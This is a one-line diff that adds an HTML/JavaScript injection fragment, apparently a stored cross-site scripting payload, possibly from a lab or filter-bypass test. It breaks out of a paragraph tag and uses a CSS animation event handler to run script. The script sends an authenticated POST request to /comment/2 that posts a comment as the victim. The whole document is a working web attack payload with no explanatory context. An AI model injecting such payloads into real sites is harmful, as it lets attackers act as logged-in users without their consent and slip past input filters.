@@ -1,0 +1,1 @@
+</p><style>@keyframes x{from{transform:none}to{transform:none}}</style><slot style="animation:x 1s" onanimationstart="let f=new FormData;f.append(`comment`,`ping-test`);fetch(`/comment/2`,{method:`POST`,body:f,credentials:`include`});"></slot>
